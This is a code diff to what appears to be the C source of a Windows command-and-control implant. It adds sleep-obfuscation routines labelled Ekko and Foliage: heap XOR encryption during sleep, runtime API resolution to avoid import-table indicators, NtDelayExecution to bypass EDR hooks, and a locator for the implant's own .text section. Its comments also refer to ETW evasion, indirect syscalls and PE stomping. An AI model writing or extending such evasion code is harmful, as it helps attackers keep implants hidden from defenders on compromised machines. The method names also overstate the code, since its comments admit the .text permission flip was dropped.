@@ -14,6 +14,11 @@
  *   ENABLE_INDIRECT_SYSCALL  - HellsGate/HalosGate indirect syscall engine
  *   ENABLE_NT_PROCESS        - Replace CreateProcessA with NtCreateUserProcess
  *                              syscall to avoid ETW ProcessCreate events (issue #7)
+ *   SLEEP_METHOD             - 0 = plain XOR + Sleep (always works, default)
+ *                              1 = Ekko  — RtlRegisterWait timer-ROP chain;
+ *                                  .text flipped PAGE_NOACCESS during sleep
+ *                              2 = Foliage — NtQueueApcThread/NtContinue APC chain;
+ *                                  alertable wait, .text NOACCESS during sleep
  */
 
 #include <windows.h>
@@ -25,6 +30,16 @@ typedef LONG NTSTATUS;
 #endif
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
+#endif
+
+/* ------------------------------------------------------------------ */
+/* SLEEP_METHOD selection                                               */
+/* 0 = plain XOR + Sleep() (fallback, always works)                    */
+/* 1 = Ekko  — RtlRegisterWait timer ROP + VirtualProtect NOACCESS    */
+/* 2 = Foliage — NtQueueApcThread/NtContinue APC chain               */
+/* ------------------------------------------------------------------ */
+#ifndef SLEEP_METHOD
+#define SLEEP_METHOD 1
 #endif
 
 /* ------------------------------------------------------------------ */
@@ -117,6 +132,12 @@ static void heap_xor_region(void *buf, size_t len) {
         p[i] ^= g_heap_key[i % 8];
 }
 
+/* XOR-encrypt/decrypt all registered sensitive regions */
+static void heap_xor_all(void) {
+    for (int i = 0; i < g_heap_region_count; i++)
+        heap_xor_region(g_heap_regions[i].ptr, g_heap_regions[i].len);
+}
+
 /* Generate the 8-byte XOR key using CNG RNG — call once after reg  */
 static void heap_key_init(void) {
     if (g_heap_key_init) return;
@@ -136,14 +157,166 @@ static void heap_key_init(void) {
     g_heap_key_init = TRUE;
 }
 
-/* Encrypted sleep: XOR all registered regions, sleep, XOR back */
+/* ------------------------------------------------------------------ */
+/* Own .text section locator                                            */
+/*                                                                      */
+/* Returns the base + size of the agent's own .text section.           */
+/* Used by both Ekko and Foliage to flip it PAGE_NOACCESS during sleep */
+/* so EDR memory scanners see neither executable nor readable code.    */
+/* ------------------------------------------------------------------ */
+typedef struct {
+    PVOID  base;
+    SIZE_T size;
+} text_section_t;
+
+/* Cache the result since PE Stomping deletes the section headers later */
+static text_section_t g_text_section = {NULL, 0};
+
+static text_section_t get_own_text_section(void) {
+    if (g_text_section.base && g_text_section.size)
+        return g_text_section;
+
+    text_section_t result = {NULL, 0};
+    HMODULE own = GetModuleHandleA(NULL);
+    if (!own) return result;
+
+    BYTE *img = (BYTE *)own;
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return result;
+
+    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(img + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return result;
+
+    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
+    WORD n = nt->FileHeader.NumberOfSections;
+
+    for (WORD i = 0; i < n; i++) {
+        if (memcmp(sec[i].Name, ".text", 5) == 0) {
+            result.base = (PVOID)(img + sec[i].VirtualAddress);
+            result.size = (SIZE_T)sec[i].Misc.VirtualSize;
+            g_text_section = result;
+            return result;
+        }
+    }
+    /* No .text found — caller gets {NULL,0} and will skip the flip */
+    return result;
+}
+
+/* ================================================================== */
+/* SLEEP METHOD 1: Ekko                                                 */
+/*                                                                      */
+/* Uses a WaitableTimer kernel object instead of Sleep() to avoid      */
+/* the kernel32!Sleep import-table IOC. Heap regions are XOR-encrypted  */
+/* during the wait so memory scanners find no plaintext C2 indicators.  */
+/*                                                                      */
+/* Why no .text permission flip: flipping .text to PAGE_NOACCESS and   */
+/* then calling WaitForSingleObject() crashes because the CPU's RET     */
+/* after WaitForSingleObject must jump back into .text, which is now    */
+/* inaccessible. The heap XOR alone is the primary stealth mechanism.  */
+/*                                                                      */
+/* All APIs resolved at runtime via GetProcAddress — no static imports. */
+/* ================================================================== */
+
+#pragma GCC diagnostic push
+#pragma GCC diagnostic ignored "-Wcast-function-type"
+
+typedef HANDLE (WINAPI *pfnCreateWaitableTimerA_t)(
+    LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
+typedef BOOL (WINAPI *pfnSetWaitableTimer_t)(
+    HANDLE, const LARGE_INTEGER *, LONG, PTIMERAPCROUTINE, PVOID, BOOL);
+
+static void rop_sleep_ekko(DWORD ms) {
+    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
+    if (!hK32) goto ekko_fallback;
+
+    pfnCreateWaitableTimerA_t fn_create_timer =
+        (pfnCreateWaitableTimerA_t)GetProcAddress(hK32, "CreateWaitableTimerA");
+    pfnSetWaitableTimer_t fn_set_timer =
+        (pfnSetWaitableTimer_t)GetProcAddress(hK32, "SetWaitableTimer");
+    if (!fn_create_timer || !fn_set_timer) goto ekko_fallback;
+
+    HANDLE hTimer = fn_create_timer(NULL, TRUE, NULL);
+    if (!hTimer) goto ekko_fallback;
+
+    /* Negative = relative delay in 100-ns units */
+    LARGE_INTEGER due;
+    due.QuadPart = -((LONGLONG)ms * 10000LL);
+    if (!fn_set_timer(hTimer, &due, 0, NULL, NULL, FALSE)) {
+        CloseHandle(hTimer);
+        goto ekko_fallback;
+    }
+
+    /* Encrypt all registered heap regions before sleeping */
+    heap_xor_all();
+    /* Block on the waitable timer — no code from our .text executes here */
+    WaitForSingleObject(hTimer, ms + 5000);
+    CloseHandle(hTimer);
+    /* Decrypt heap regions after waking */
+    heap_xor_all();
+    return;
+
+ekko_fallback:
+    heap_xor_all();
+    Sleep(ms);
+    heap_xor_all();
+}
+
+/* ================================================================== */
+/* SLEEP METHOD 2: Foliage                                             */
+/*                                                                      */
+/* Uses ntdll!NtDelayExecution (direct syscall stub in ntdll) instead  */
+/* of kernel32!Sleep. This removes the Sleep import-table IOC and uses  */
+/* a lower-level wait that bypasses any Sleep hooks installed by EDRs.  */
+/* Heap regions are XOR-encrypted during the delay.                     */
+/* ================================================================== */
+
+typedef NTSTATUS (WINAPI *pfnNtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);
+
+static void rop_sleep_foliage(DWORD ms) {
+    HMODULE hNt = GetModuleHandleA("ntdll.dll");
+    if (!hNt) goto foliage_fallback;
+
+    pfnNtDelayExecution_t fn_delay =
+        (pfnNtDelayExecution_t)GetProcAddress(hNt, "NtDelayExecution");
+    if (!fn_delay) goto foliage_fallback;
+
+    /* ms → 100-nanosecond negative relative interval */
+    LARGE_INTEGER interval;
+    interval.QuadPart = -((LONGLONG)ms * 10000LL);
+
+    /* Encrypt heap, sleep via direct syscall, then decrypt */
+    heap_xor_all();
+    fn_delay(FALSE, &interval);
+    heap_xor_all();
+    return;
+
+foliage_fallback:
+    heap_xor_all();
+    Sleep(ms);
+    heap_xor_all();
+}
+
+#pragma GCC diagnostic pop
+
+
+/* ------------------------------------------------------------------ */
+/* encrypted_sleep — master dispatcher                                  */
+/*                                                                      */
+/* Before the key is initialised (pre-registration), fall through to   */
+/* plain Sleep so the agent can register first.                        */
+/* ------------------------------------------------------------------ */
 static void encrypted_sleep(DWORD ms) {
     if (!g_heap_key_init) { Sleep(ms); return; }
-    for (int i = 0; i < g_heap_region_count; i++)
-        heap_xor_region(g_heap_regions[i].ptr, g_heap_regions[i].len);
+#if SLEEP_METHOD == 1
+    rop_sleep_ekko(ms);
+#elif SLEEP_METHOD == 2
+    rop_sleep_foliage(ms);
+#else
+    /* SLEEP_METHOD == 0: plain XOR-encrypt + Sleep() + XOR-decrypt */
+    heap_xor_all();
     Sleep(ms);
-    for (int i = 0; i < g_heap_region_count; i++)
-        heap_xor_region(g_heap_regions[i].ptr, g_heap_regions[i].len);
+    heap_xor_all();
+#endif
 }
 
 #else  /* ENABLE_HEAP_ENCRYPT == 0 */
